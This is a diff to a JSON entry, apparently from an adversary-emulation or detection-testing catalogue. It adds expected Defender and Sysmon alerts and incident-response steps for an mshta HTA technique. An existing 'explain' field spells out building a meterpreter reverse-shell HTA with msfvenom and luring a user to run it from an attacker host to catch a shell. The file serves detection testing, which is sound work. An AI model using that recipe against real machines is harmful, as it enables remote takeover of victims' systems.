@@ -149,6 +149,30 @@
         "defender-endpoint",
         "sysmon"
       ]
+    },
+    "validation": {
+      "expected_events": [
+        {
+          "source": "defender-endpoint",
+          "description": "HTA - mshta.exe Execution - Sentinel"
+        },
+        {
+          "source": "sysmon",
+          "event_id": "1",
+          "description": "Process creation (Sysmon)"
+        },
+        {
+          "source": "sysmon",
+          "description": "proc_creation_win_mshta_remote_payload"
+        }
+      ],
+      "success_criteria": "At least one behavioral detection fires within 60 seconds of attack execution",
+      "response_steps": [
+        "Correlate alert with source host, user account, and timestamp",
+        "Review Microsoft Defender for Endpoint, Sysmon for surrounding context (5 min before/after)",
+        "Verify whether the activity matches known administrative baselines or change windows",
+        "If confirmed malicious, isolate the host and escalate to incident response"
+      ]
     }
   },
   "explain": "Builds an HTA payload that Windows runs through the trusted mshta.exe:\n  msfvenom -p windows/x64/meterpreter/reverse_tcp   the payload\n  LHOST/LPORT                                       callback details\n  -f hta-psh                                        HTA-with-PowerShell format\n  -o evil.hta                                       output file\nAn .hta is HTML plus script that mshta.exe executes with full local privileges (no browser sandbox); host it, lure the user to 'mshta.exe http://<lhost>/evil.hta', and catch the shell."
